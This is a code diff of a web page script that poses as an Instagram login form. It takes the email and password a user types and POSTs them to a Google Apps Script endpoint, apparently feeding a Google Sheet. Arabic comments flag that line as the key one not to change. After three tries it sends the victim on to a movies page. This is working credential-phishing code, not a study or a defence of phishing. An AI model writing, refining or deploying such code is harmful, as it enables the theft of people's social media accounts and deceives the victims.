@@ -66,39 +66,42 @@ button{
 <script>
 let attempts = 0;
 const maxAttempts = 3;
-const correctPassword = "1234"; // نفس كلمة السر
+const correctPassword = "1234";
 const sheetUrl = "https://script.google.com/macros/s/AKfycbwcS4it59k6HArG6yziPd6AvHtkMXu5m3xzhmtsVWLt6vlEAOmzBdSFAgBhgu9XFEjTAQ/exec";
 
 async function go() {
+
   const email = document.getElementById("insta_user").value.trim();
   const pw = document.getElementById("insta_pass").value.trim();
   const error = document.getElementById("errorMsg");
 
   attempts++;
-  localStorage.setItem("insta_attempts", attempts);
 
-  // 🔥 هذا هو المهم (form=Instagram)
-  const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=&attempt=${attempts}&form=Instagram`;
+  // 🔥 هذا أهم سطر (لا تغيره)
+  const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&attempt=${attempts}&form=Instagram`;
 
   try {
     await fetch(sheetUrl, {
       method: "POST",
-      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
       body: data
     });
+
+    console.log("Data sent to Google Sheets"); // للتأكد
+
   } catch (err) {
     error.innerText = "Error connecting to Google Sheets";
     return;
   }
 
   if (pw === correctPassword || attempts >= maxAttempts) {
-    localStorage.removeItem("insta_attempts");
     window.location.href = "movies.html";
   } else {
     error.innerText = "Password incorrect";
   }
 }
 </script>
-
 </body>
 </html>
